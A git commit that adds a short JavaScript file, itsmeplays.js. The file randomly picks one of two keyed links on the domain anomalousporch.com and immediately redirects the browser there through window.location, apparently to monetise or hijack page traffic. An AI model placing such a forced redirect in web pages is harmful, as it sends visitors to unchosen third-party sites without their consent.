94fe9b29786964a64b503ab23cd8a2eb93b8f5b8
itsmeplayfj <94605694+itsmeplayfj@users.noreply.github.com>
2022-07-07 02:13:40 -0700

    Create itsmeplays.js

---
+++ itsmeplays.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+'https://anomalousporch.com/xtqed6ym?key=96fc440cd6ee5c86fdc6824e763d6d0f',
+'https://anomalousporch.com/gw4jagcm?key=40440900b0477fd9b7dbfcc4cf84ac19'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
